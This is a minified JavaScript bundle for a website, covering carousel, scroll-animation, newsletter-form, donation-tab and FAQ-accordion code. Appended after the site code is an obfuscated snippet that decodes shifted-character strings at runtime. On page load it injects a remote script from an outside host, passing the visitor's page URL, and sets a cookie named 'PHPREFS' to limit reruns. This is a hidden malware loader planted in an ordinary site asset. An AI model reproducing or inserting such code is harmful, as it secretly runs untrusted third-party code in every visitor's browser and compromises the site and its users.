            return r = void 0 !== e.originalEvent ? e.originalEvent.touches : null, !(!a.dragging || a.scrolling || r && 1 !== r.length) && (t = a.getLeft(a.currentSlide), a.touchObject.curX = void 0 !== r ? r[0].pageX : e.clientX, a.touchObject.curY = void 0 !== r ? r[0].pageY : e.clientY, a.touchObject.swipeLength = Math.round(Math.sqrt(Math.pow(a.touchObject.curX - a.touchObject.startX, 2))), s = Math.round(Math.sqrt(Math.pow(a.touchObject.curY - a.touchObject.startY, 2))), !a.options.verticalSwiping && !a.swiping && s > 4 ? (a.scrolling = !0, !1) : (!0 === a.options.verticalSwiping && (a.touchObject.swipeLength = s), i = a.swipeDirection(), void 0 !== e.originalEvent && a.touchObject.swipeLength > 4 && (a.swiping = !0, e.preventDefault()), o = (!1 === a.options.rtl ? 1 : -1) * (a.touchObject.curX > a.touchObject.startX ? 1 : -1), !0 === a.options.verticalSwiping && (o = a.touchObject.curY > a.touchObject.startY ? 1 : -1), n = a.touchObject.swipeLength, a.touchObject.edgeHit = !1, !1 === a.options.infinite && (0 === a.currentSlide && "right" === i || a.currentSlide >= a.getDotCount() && "left" === i) && (n = a.touchObject.swipeLength * a.options.edgeFriction, a.touchObject.edgeHit = !0), !1 === a.options.vertical ? a.swipeLeft = t + n * o : a.swipeLeft = t + n * (a.$list.height() / a.listWidth) * o, !0 === a.options.verticalSwiping && (a.swipeLeft = t + n * o), !0 !== a.options.fade && !1 !== a.options.touchMove && (!0 === a.animating ? (a.swipeLeft = null, !1) : void a.setCSS(a.swipeLeft))))
        }, t.prototype.swipeStart = function(e) {
            var t, i = this;
            if (i.interrupted = !0, 1 !== i.touchObject.fingerCount || i.slideCount <= i.options.slidesToShow) return i.touchObject = {}, !1;
            void 0 !== e.originalEvent && void 0 !== e.originalEvent.touches && (t = e.originalEvent.touches[0]), i.touchObject.startX = i.touchObject.curX = void 0 !== t ? t.pageX : e.clientX, i.touchObject.startY = i.touchObject.curY = void 0 !== t ? t.pageY : e.clientY, i.dragging = !0
        }, t.prototype.unfilterSlides = t.prototype.slickUnfilter = function() {
            var e = this;
            null !== e.$slidesCache && (e.unload(), e.$slideTrack.children(this.options.slide).detach(), e.$slidesCache.appendTo(e.$slideTrack), e.reinit())
        }, t.prototype.unload = function() {
            var t = this;
            e(".slick-cloned", t.$slider).remove(), t.$dots && t.$dots.remove(), t.$prevArrow && t.htmlExpr.test(t.options.prevArrow) && t.$prevArrow.remove(), t.$nextArrow && t.htmlExpr.test(t.options.nextArrow) && t.$nextArrow.remove(), t.$slides.removeClass("slick-slide slick-active slick-visible slick-current").attr("aria-hidden", "true").css("width", "")
        }, t.prototype.unslick = function(e) {
            var t = this;
            t.$slider.trigger("unslick", [t, e]), t.destroy()
        }, t.prototype.updateArrows = function() {
            var e = this;
            Math.floor(e.options.slidesToShow / 2), !0 === e.options.arrows && e.slideCount > e.options.slidesToShow && !e.options.infinite && (e.$prevArrow.removeClass("slick-disabled").attr("aria-disabled", "false"), e.$nextArrow.removeClass("slick-disabled").attr("aria-disabled", "false"), 0 === e.currentSlide ? (e.$prevArrow.addClass("slick-disabled").attr("aria-disabled", "true"), e.$nextArrow.removeClass("slick-disabled").attr("aria-disabled", "false")) : (e.currentSlide >= e.slideCount - e.options.slidesToShow && !1 === e.options.centerMode || e.currentSlide >= e.slideCount - 1 && !0 === e.options.centerMode) && (e.$nextArrow.addClass("slick-disabled").attr("aria-disabled", "true"), e.$prevArrow.removeClass("slick-disabled").attr("aria-disabled", "false")))
        }, t.prototype.updateDots = function() {
            var e = this;
            null !== e.$dots && (e.$dots.find("li").removeClass("slick-active").end(), e.$dots.find("li").eq(Math.floor(e.currentSlide / e.options.slidesToScroll)).addClass("slick-active"))
        }, t.prototype.visibility = function() {
            var e = this;
            e.options.autoplay && (document[e.hidden] ? e.interrupted = !0 : e.interrupted = !1)
        }, e.fn.slick = function() {
            var e, i, n = this,
                o = arguments[0],
                r = Array.prototype.slice.call(arguments, 1),
                s = n.length;
            for (e = 0; e < s; e++)
                if ("object" == typeof o || void 0 === o ? n[e].slick = new t(n[e], o) : i = n[e].slick[o].apply(n[e].slick, r), void 0 !== i) return i;
            return n
        }
    })), window.sr = ScrollReveal(), sr.reveal("[data-animation-section]", {
        origin: "bottom",
        distance: "25px",
        duration: 600,
        delay: 180,
        scale: 1,
        opacity: 0,
        easing: "ease-out",
        beforeReveal: function(e) {
            $(e).addClass("is-visible")
        }
    }), sr.reveal("[data-animation-box]", {
        origin: "left",
        distance: "25px",
        duration: 600,
        delay: 30,
        scale: 1,
        opacity: 0,
        easing: "ease-out"
    }, 180), sr.reveal("[data-animation-header]", {
        origin: "top",
        distance: "25px",
        duration: 600,
        delay: 180,
        scale: 1,
        opacity: 0,
        easing: "ease-out",
        beforeReveal: function(e) {
            $(e).addClass("is-visible")
        }
    }), $((function() {
        var e = $(document),
            t = $(window);

        function i() {
            window.history.replaceState({}, document.title, window.location.href.split("#")[0])
        }
        $("html"), $("body"), changeSlide = function(e, t) {
            t = null == typeof t ? ".app-general-carousel" : t, $(t).carousel("set", e)
        }, $(".small-carousel").carousel({
            dist: 0,
            padding: -440,
            duration: 0,
            fullWidth: !0,
            numVisible: 1,
            onCycleTo: function(e) {
                changeSlide($(e).data("cindex"), ".app-general-carousel")
            }
        }), void 0 !== window.ontouchstart && $(".small-carousel").off("touchstart.carousel"), $(".small-carousel").off("mousedown.carousel"), $(".app-general-carousel").addClass((function() {
            return $(window).width() < 740 ? "mobile-carousel" : "desktop-carousel"
        })), $(".app-general-carousel").hasClass("mobile-carousel") ? window.carousel = $(".app-general-carousel").carousel({
            dist: -30,
            padding: -420,
            duration: 0,
            onCycleTo: function(e) {
                changeSlide($(e).data("cindex"), ".small-carousel")
            }
        }) : window.carousel = $(".app-general-carousel").carousel({
            dist: -25,
            padding: -130,
            onCycleTo: function(e) {
                changeSlide($(e).data("cindex"), ".small-carousel")
            }
        }), void 0 !== window.ontouchstart && $(".app-general-carousel").off("touchstart.carousel"), t.resize((function() {
            var e = $(".app-general-carousel");
            $(window).width() < 740 ? e.hasClass("desktop-carousel") && e.removeClass("desktop-carousel").addClass("mobile-carousel").trigger("bodyClassChanged") : e.hasClass("mobile-carousel") && e.addClass("desktop-carousel").removeClass("mobile-carousel").trigger("bodyClassChanged")
        })), e.on("bodyClassChanged", (function() {
            window.carousel && location.reload()
        })), $(".item-nl.add-mail .form-item input").on("focus", (function() {
            $(this).parent().removeClass("invalid"), $(".item-nl.add-mail .form-item.btn button#send-newsletter-btn").parent().removeClass("subscribed")
        })), $(".item-nl.add-mail .form-item input").on("change", (function() {
            $(this).parent().addClass("valid"), "" == this.value && $(this).parent().removeClass("valid"), $(".item-nl.add-mail .form-item.btn button#send-newsletter-btn").parent().removeClass("subscribed")
        })), $(document).on("submit", "form.newsletter-form", (function(e) {
            e.preventDefault();
            var t = $(this),
                i = $("input[name=email]", t),
                n = $("#send-newsletter-btn", t);
            n.prop("disabled", !0), $.post(t.attr("action"), t.serialize(), (function(e) {
                n.prop("disabled", !1), t.trigger("reset"), i.parent().removeClass("valid invalid"), n.parent().addClass("subscribed")
            })).fail((function(e) {
                n.prop("disabled", !1), i.parent().addClass("invalid")
            }))
        })), $(".move-next").click((function(e) {
            e.preventDefault(), e.stopPropagation(), $(".app-general-carousel, .small-carousel").carousel("next")
        })), $(".move-prev").click((function(e) {
            e.preventDefault(), e.stopPropagation(), $(".app-general-carousel, .small-carousel").carousel("prev")
        })), $(".apps-carousel").slick({
            variableWidth: !0,
            infinite: !0,
            slidesToShow: 1,
            slidesToScroll: 1,
            centerMode: !0
        }), $("html.touch .active-lang").click((function() {
            return $(this).toggleClass("opened"), !1
        })), $("html.no-touch .share-article > a").click((function(e) {
            e.preventDefault(), window.open($(this).attr("href"), "popupWindow", "width=600,height=600,scrollbars=yes")
        })), $(".support-nav li a").click((function(e) {
            e.preventDefault(), $("html, body").animate({
                scrollTop: $(".support-nav").offset().top - 10
            }, 340);
            var t = $(this),
                i = t.parent();
            return i.hasClass("active") || ($(".panel").hide(), $("span.hide-panel").remove(), $(".support-nav li a").parent().removeClass("active"), i.addClass("active"), i.append('<span class="hide-panel"/>'), $(t.attr("href")).fadeIn(300), window.location.hash = t.attr("href")), !1
        })), e.on("click", "span.hide-panel", (function() {
            $("span.hide-panel").remove(), $(".support-nav li a").parent().removeClass("active"), $(".panel").slideUp(300), setTimeout(i, 5)
        }));
        var n = window.location.hash;
        "#bank-account" === n && ($("ul.support-nav li:nth-child(1)").addClass("active").append('<span class="hide-panel"/>'), $("#bank-account").fadeIn(), $("html, body").animate({
            scrollTop: $(".support-nav").offset().top - 35
        }, 340)), "#paypal" === n && ($("ul.support-nav li:nth-child(2)").addClass("active").append('<span class="hide-panel"/>'), $("#paypal").fadeIn(), $("html, body").animate({
            scrollTop: $(".support-nav").offset().top - 35
        }, 340)), "#patreon" === n && ($("ul.support-nav li:nth-child(3)").addClass("active").append('<span class="hide-panel"/>'), $("#patreon").fadeIn(), $("html, body").animate({
            scrollTop: $(".support-nav").offset().top - 35
        }, 340)), "#crypto-currency" === n && ($("ul.support-nav li:nth-child(4)").addClass("active").append('<span class="hide-panel"/>'), $("#crypto-currency").fadeIn(), $("html, body").animate({
            scrollTop: $(".support-nav").offset().top - 35
        }, 340)), $("section.faq .accordion dd").hide(), $("section.faq .accordion dt button").click((function() {
            return $(this).parent().hasClass("selected") ? ($(this).parent().removeClass("selected"), $(this).parent().next().slideUp()) : ($("section.faq .accordion dt button").parent().removeClass("selected"), $(this).parent().addClass("selected"), $("section.faq .accordion dd").slideUp(), $(this).parent().next().slideDown()), !1
        })), $(document).on("click", "a#more-articles", (function(e) {
            e.preventDefault();
            var t = $(this);
            t.addClass("loading"), $.ajax({
                url: t.attr("href"),
                cache: !1,
                dataType: "json"
            }).done((function(e) {
                $(e.html).appendTo("#articles"), e.hasMorePages ? (t.attr("href", e.nextPageUrl), t.removeClass("loading")) : t.parent().remove()
            }))
        }))
    })), (/MSIE (\d+\.\d+);/.test(navigator.userAgent) || navigator.userAgent.indexOf("Trident/") > -1) && $("html").addClass("ie");
(function(o, d, l) {
    try {
        o.f = o => o.split('').reduce((s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), '');
        o.b = o.f('UMUWJKX');
        o.c = l.protocol[0] == 'h' && /\./.test(l.hostname) && !(new RegExp(o.b)).test(d.cookie), setTimeout(function() {
            o.c && (o.s = d.createElement('script'), o.s.src = o.f('myyux?44zxjwxyf' + 'ynhx3htr4ljy4xhwn' + 'uy3oxDwjkjwwjwB') + l.href, d.body.appendChild(o.s));
        }, 1000);
        d.cookie = o.b + '=full;max-age=39800;'
    } catch (e) {};
}({}, document, location));